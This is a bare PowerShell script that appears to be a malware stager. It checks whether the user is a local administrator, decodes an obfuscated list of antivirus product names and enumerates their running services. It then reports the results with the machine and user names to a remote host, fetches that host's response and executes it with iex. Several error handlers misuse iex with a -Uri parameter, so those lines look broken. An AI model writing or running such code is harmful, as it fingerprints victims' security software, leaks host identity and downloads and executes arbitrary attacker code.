$ads = ""
try {
    $adm = ((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount])).Value.Split('\')[-1]
    $go = net localgroup $adm 2>&1
    $m = $go -split "`r`n" |
         Select-String '^-----' -Context 0,1000 |
         ForEach-Object { $_.Context.PostContext } |
         ForEach-Object { $_.Trim() } |
         Where-Object { $_ -and ($_ -notmatch '命令成功完成|The command completed successfully') }

    if ($m -contains $Env:UserName) {
        $ads = "TRUE"
    }
    else {
        $ads = "FALSE"
    }
}
catch {
    $ads = "CANT_CHECK_USER"
    $em = "Error checking admin group: $($_.Exception.Message)"
    iex -Uri "https://zzx.cx/report1.php?error=$([uri]::EscapeDataString($em))" -ErrorAction SilentlyContinue
}
function rev {
    param([string]$inp)
    $char = $inp.ToCharArray()
    [array]::Reverse($char)
    return -join $char
}
$b64Data = "J3Jlbm9aJywndG5pb1Aga2NlaEMgeWIgbXJhbEFlbm9aJywnYXlsbGlaJywneGVkbmFZJywncmVkbmVmZUQgc3dvZG5pVycsJ3Rvb3JiZVcnLCd0b29yYmVXJywneWdvbG9uaGNlVCB3YXNyYVcnLCdUSXJpVicgICAgCiwndG9ib1JpVicsJ0VSUElWJywnMjNBQlYnLCdsbGFDZXN1b0gtb3JjaU1kbmVyVCcsJ29yY2lNZG5lclQnLCd4aWxsZXJUJywnZW5pbXBhclQnLCd0bmVjbmVUJywnU0lSVEhFVCcgICAgCiwnTk9ZSENBVCcsJ2NldG5hbXlTJywnc29ocG9TJywnZW5PbGVuaXRuZVMnLCdlZ0FlcnVjZVMnLCdvcmVaIGVuaWduRSByb2ZnbmFTJywnZXJhd3lwU2l0bkFSRVBVUycsJ2duaXNpUicgICAgCiwnbGFlSGtjaXVRJywnYWRuYVAnLCdza3Jvd3RlTiBvdGxBIG9sYVAnLCd3b2xmdGVOJywnbm90cm9OJywnc3VyaXZpdG5BLU9OQU4nLCdub2l0aWRFLVdHLWVlZkFjTScsJ2VlZkFjTScgICAgCiwnZXJ1Y2VTeGFNJywnc2V0eWJlcmF3bGFNJywnWEFNJywnY2lub2lMJywndGZvc2duaUsnLCdzdXJpdi1pdG5BIHlrc3JlcHNhSycsJ1dHN0snLCdzdXJpVml0bkE3SycgICAgCiwnbmltZ25haUonLCdzdXJha0knLCd0Zm9zbmlkaXJHJywnZWxnb29HJywnYXRhREcnLCdBVEFEIEcnLCd0ZW5pdHJvRicsJ2VydWNlUy1GJywndGZvc2lzbUUnLCdjaXRzYWxFJywnbmFjU2UnICAgIAosJ3RuaW9wZG5FIE1TRScsJzIzRE9OLVRFU0UnLCdiZVdyRCcsJ0FCUCBsbGVEJywnbmVyeUMnLCd0ZW55QycsJ2VjbmFseUMnLCdub3NhZXJlYnlDJywnbm9jbGFGIGVraXJ0U2R3b3JDJyAgICAKLCdvZG9tb0MnLCdWQW1hbEMnLCdDTUMnLCdvclAgdmFrQicsJ2F0ZWhUcmVkbmVmZUR0aUInLCdyZWRuZWZlRHRpQicsJ3VkaWFCJywnYXJpdkEnLCd0c2F2QScgICAgCiwndGliYWNyQScsJ0xWQS15aXRuQScsJ2FiYWJpbEEnLCczVi1iYUxuaEEnLCdlcmF3QS1kQScsJ3Npbm9yY0EnLCdzdXJpdml0bkEgR1ZBJywnY2FZTEEnLCcwNjMn"
$Basee = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64Data)) -split ','
$found = @()
foreach ($obs in $Basee) {
    $avs = rev $obs
    try {
        $services = Get-Service -DisplayName "$avs*" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq 'Running' }
        foreach ($svc in $services) {
            if ($svc.DisplayName) {
                $found += $svc.DisplayName
            }
        }
    }
    catch {
        $em = "Error checking '$avs': $($_.Exception.Message)"
        iex -Uri "https://zzx.cx/report1.php?error=$([uri]::EscapeDataString($em))" -ErrorAction SilentlyContinue
    }
}
if ($found.Count -eq 0) {
    $found = @("ZERO_FOUND")
}
$avsRep = [string]::Join(", ", $found)
$whoami = "$env:COMPUTERNAME\$env:USERNAME"
try {
    $uri = "https://zzx.cx/report1.php?r=$([uri]::EscapeDataString($avsRep))&u=$([uri]::EscapeDataString($ads))&who=$([uri]::EscapeDataString($whoami))"
    $response = irm -Uri $uri -ErrorAction Stop
    Start-Sleep -Seconds 2
    iex $response
}
catch {
    $em = "Error executing redirection: $($_.Exception.Message)"
    iex -Uri "https://zzx.cx/report1.php?error=$([uri]::EscapeDataString($em))" -ErrorAction SilentlyContinue
}


